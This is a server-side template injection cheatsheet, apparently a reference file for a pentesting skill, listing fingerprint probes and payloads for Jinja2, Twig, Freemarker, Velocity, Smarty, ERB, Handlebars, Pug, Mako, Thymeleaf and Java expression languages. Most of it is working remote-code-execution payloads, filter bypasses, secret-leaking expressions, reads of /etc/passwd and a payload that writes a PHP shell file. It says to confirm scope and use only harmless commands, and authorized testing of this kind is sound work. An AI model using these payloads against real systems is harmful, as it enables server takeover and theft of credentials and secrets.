# SSTI Cheatsheet — per-engine payloads

Companion to `SKILL.md` and `reference.md`. All RCE proofs use the **harmless** `id`
command — swap for `hostname`/`whoami` as needed. Confirm scope before firing. Never
use destructive commands.

URL-encode `{`,`}`,`%`,`'`,`<`,`>`,`#`,`$` when sending in query strings.

## Quick fingerprint matrix

| Probe | Result → engine |
|---|---|
| `{{7*7}}` → `49` | a `{{ }}` engine (Jinja2 / Twig / Handlebars) |
| `{{7*'7'}}` → `7777777` | **Jinja2** (Python) |
| `{{7*'7'}}` → `49` | **Twig** (PHP) |
| `${7*7}` → `49` | Freemarker / Velocity / JSP EL / Smarty |
| `<%= 7*7 %>` → `49` | ERB (Ruby) / EJS (Node) |
| `#{7*7}` → `49` | Pug/Jade / Thymeleaf |
| `{7*7}` → `49` | Smarty (also `${7*7}`) |
| `a{*comment*}b` → `ab` | Smarty fingerprint |

---

## Jinja2 (Python / Flask, Django-like)

| Goal | Payload |
|---|---|
| Detect | `{{7*7}}` → `49` ; `{{7*'7'}}` → `7777777` |
| Config/secrets | `{{ config }}` / `{{ config.items() }}` (Flask: leaks `SECRET_KEY`, DB URI) |
| Explore globals | `{{ self.__init__.__globals__ }}` |
| Class walk | `{{ ''.__class__.__mro__[1].__subclasses__() }}` |
| RCE (os via globals) | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` |
| RCE (subprocess) | `{{ ''.__class__.__mro__[1].__subclasses__()[<idx>]('id',shell=True,stdout=-1).communicate() }}` |
| RCE (lipsum) | `{{ lipsum.__globals__['os'].popen('id').read() }}` |
| RCE (request attr bypass) | `{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('__builtins__')|attr('\x5f\x5fgetitem\x5f\x5f')('__import__')('os')|attr('popen')('id')|attr('read')() }}` |
| Filter bypass | `{{ request['__cl'+'ass__'] }}` ; `{{()["__cla"+"ss__"]}}` |

## Twig (PHP / Symfony)

| Goal | Payload |
|---|---|
| Detect | `{{7*7}}` → `49` ; `{{7*'7'}}` → `49` |
| Info | `{{ _self }}` ; `{{ dump(app) }}` (Symfony debug) |
| RCE (filter) | `{{ ['id']|filter('system') }}` |
| RCE (map) | `{{ ['id']|map('system')|join }}` |
| RCE (Twig 1.x) | `{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}` |
| RCE (call_user_func) | `{{ {'id':'system'}|map(system) }}` |

## Freemarker (Java)

| Goal | Payload |
|---|---|
| Detect | `${7*7}` → `49` ; `${"freemarker.template.utility.Execute"?new}` |
| RCE (Execute) | `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }` |
| RCE (ObjectConstructor) | `${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}` |
| Env vars | `${ "freemarker.template.utility.Execute"?new()("env") }` |

## Velocity (Java)

| Goal | Payload |
|---|---|
| Detect | `#set($x=7*7)$x` → `49` |
| RCE (chain) | `#set($e="e")$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")` |
| RCE (read output) | `#set($s=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").getInputStream())#set($br=$class.inspect("java.io.BufferedReader").type.getConstructor($class.inspect("java.io.InputStreamReader").type).newInstance(...))` (use `$class.inspect(...)` chain to stream stdout) |

## Smarty (PHP)

| Goal | Payload |
|---|---|
| Detect | `{$smarty.version}` ; `{7*7}` → `49` |
| RCE (PHP block, ≤3.0) | `{php}system('id');{/php}` |
| RCE (static call) | `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}` |
| RCE (self) | `{self::getStreamVariable("file:///etc/passwd")}` |

## ERB (Ruby / Rails)

| Goal | Payload |
|---|---|
| Detect | `<%= 7*7 %>` → `49` |
| List dir | `<%= Dir.entries('/') %>` |
| Read file | `<%= File.open('/etc/hostname').read %>` |
| RCE (backticks) | `` <%= `id` %> `` |
| RCE (system) | `<%= system('id') %>` ; `<%= IO.popen('id').read %>` |

## Handlebars (Node.js)

| Goal | Payload |
|---|---|
| Detect | `{{7*7}}` → error/raw (no math) — fingerprint via this |
| RCE | `{{#with "s" as |string|}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}` |

## Pug / Jade (Node.js)

| Goal | Payload |
|---|---|
| Detect | `#{7*7}` → `49` |
| RCE | `#{root.process.mainModule.require('child_process').execSync('id')}` |
| RCE (block) | `- var x = root.process.mainModule.require('child_process').execSync('id'); = x` |

## Mako (Python)

| Goal | Payload |
|---|---|
| Detect | `${7*7}` → `49` |
| RCE (popen) | `<% import os x=os.popen('id').read() %>${x}` |
| RCE (oneline) | `${ self.module.cache.util.os.system("id") }` |

## Thymeleaf (Java / Spring) — note: expression preprocessing `__...__`

| Goal | Payload |
|---|---|
| Detect | `${7*7}` in expression context → `49` |
| RCE | `${T(java.lang.Runtime).getRuntime().exec('id')}` |
| RCE (preprocessing) | `__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x` |

## Java generic (SpEL / JSP EL / OGNL contexts)

| Goal | Payload |
|---|---|
| Env vars | `${T(java.lang.System).getenv()}` |
| RCE (SpEL) | `T(java.lang.Runtime).getRuntime().exec('id')` |
| RCE (new) | `new java.lang.ProcessBuilder({'id'}).start()` |

---

### Capturing the PoC
For each finding log to `./_EXPLOIT/`: (1) the `7*7→49` request proving evaluation,
(2) the request proving impact (`id` output, file contents, or leaked secret). That
pair is the proof. Harmless commands only.
